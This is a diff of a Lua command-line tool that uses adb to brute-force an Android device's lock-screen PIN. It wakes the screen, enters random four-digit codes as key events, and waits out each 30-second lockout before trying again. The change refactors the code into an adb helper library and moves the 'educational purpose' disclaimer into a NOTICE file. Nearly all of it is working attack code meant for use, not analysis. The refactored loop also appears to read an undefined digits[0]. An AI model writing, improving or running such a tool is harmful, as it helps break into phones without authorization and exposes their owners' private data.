@@ -1,26 +1,34 @@
 #!/usr/bin/env lua
 
-dofile("functions.lua")
+ARGS = { ... }
+VERBOSE = false
 
+for _, arg in ipairs(ARGS) do
+    if arg == "-v" or arg == "--verbose" then VERBOSE = true end
+end
 math.randomseed(os.time())
 
-local adb_path = nil
-local disclamer = "This program were created for educational purpose ONLY\n" ..
-                  "                       The developer is not responsible for any crime commited"
+dofile("src/functions.lua")
+dofile("src/libadb.lua")
 
-msg("Initialization...")
+local notice = io.open("NOTICE", "r")
 
-msg("Checking adb...")
+if notice then
+    print(notice:read("a"))
+    notice:close()
+end
 
 -- Check adb
-adb_path = find_adb()
+msg("Searching for adb executable...")
+adb:find()
 
-if not adb_path then
-    msg("Adb executable do not exist in PATH")
+if not adb.path then
+    msg("Cannot find adb executable in " .. C.ylw .. "$PATH" .. C.rst, "ERROR")
     return 1
 end
 
-msg("Found adb at \27[1;33m" .. adb_path .. "\27[0m", "OK")
+
+msg("Found adb at \27[1;33m" .. adb.path .. "\27[0m", "OK")
 msg("Checking privileges...")
 
 local username = os.getenv("USER")
@@ -28,89 +36,67 @@ local uid = pread("id -u " .. username)
 
 if not uid then return 1 end
 
-uid = tonumber(uid)
-
-if uid ~= 0 then
+if tonumber(uid) ~= 0 then
     msg("Not enough privileges", "ERROR")
     return 1
 end
 
 
-msg("Current user: \27[1;33m" .. username .. "\27[0m (uid \27[1;33m" .. tostring(uid) .. "\27[0m)", "OK")
+msg("Current user: " .. C.ylw .. username .. C.rst, "OK")
 msg("Checking connected devices...")
 
-
-local devices = pread("adb devices", true)
-
-if not devices then return 1 end
-
-local device = getline(devices, 1):gsub("device", ""):gsub("^%s*(.-)%s*$", "%1") or nil
-
+local device = adb:get_device()
 
 if not device or device == "" then
     msg("No devices connected", "ERROR")
     return 1
 end
 
+
 msg("Found connected device \27[1;33m" .. device .. "\27[0m", "OK")
 msg("Tests passed, initialization complete", "OK")
 
-msg(disclamer, "WARNING")
-
 sleep(1)
-msg("Unlocking device...")
 
-os.execute("adb shell input keyevent 82")
-sleep(0.05)
-os.execute("adb shell input swipe 407 1211 378 85")
-
-msg("Device unlocked", "OK")
-
+adb:wake()
 
 local combination = ""
-local attempts = 1
-local max_retries = 5
+local attempt = 1
+local retries_limit = 5
 
 local digits = {}
 
-
-for retries = 0, 9999 do
-    retries = retries + 1
-
-    for _ = 1, 4 do
-        digits[_] = math.random(0, 9)
-        combination = combination .. digits[_]
-        digits[_] = digits[_] + 7
+for retries = 1, 9999 do
+    for i = 1, 4 do
+        digits[i] = math.random(0, 9)
+        combination = combination .. digits[i]
+        digits[i] = digits[i] + 7
     end
 
-    msg("Attempt \27[1;33m" .. attempts .. "\27[0m Retries \27[1;33m" .. retries .. "\27[0m: Trying combination: \27[1;33m" .. combination .. "\27[0m")
+    msg(("Attempt %s%i%s, Retry %s%i%s: Combination: %s%s%s"):format(C.ylw, attempt, C.rst, C.ylw, retries, C.rst, C.ylw, combination, C.rst), "VERBOSE")
 
-    if attempts == 3 then
-        msg("Exceeded limit of attempts, from now you will have only one attempt to enter PIN and then 30 seconds cooldown will be activated", "WARNING")
-        max_retries = 1
+    if attempt == 3 then
+        msg(("Exceeded limit of %s3%s attempts"):format(C.ylw, C.rst), "WARNING")
+        msg(("From now on, there is only %s1%s retry before %s30%s second cooldown"):format(C.ylw, C.rst, C.ylw, C.rst), "WARNING")
+
+        retries_limit = 1
     end
 
-    for _ = 1, 4 do
-        os.execute("adb shell input keyevent " .. digits[_])
+    for i = 0, 4 do
+        adb:send_input("keyevent", digits[i])
         sleep(0.02)
     end
+    combination = ""
 
-    sleep(0.02)
-    os.execute("adb shell input keyevent 66")
+    if retries % retries_limit == 0 then
+        attempt = attempt + 1
 
-    if retries % max_retries == 0 then
-        attempts = attempts + 1
+        sleep(0.08)
+        adb:send_input("keyevent", 66)
 
-        msg("Exceeded limit of \27[1;33m" .. max_retries .."\27[0m retries. Waiting \27[1;33m30\27[0m seconds...", "WARNING")
-
-        sleep(0.05)
-        os.execute("adb shell input keyevent 66")
-
+        msg(("Limit of %s%i%s retries exceeded, waiting %s30%s seconds..."):format(C.ylw, retries_limit, C.rst, C.ylw, C.rst), "WARNING")
         sleep(30)
 
-        os.execute("adb shell input keyevent 82")
-        os.execute("adb shell input swipe 407 1211 378 85")
+        adb:wake()
     end
-
-    combination = ""
 end
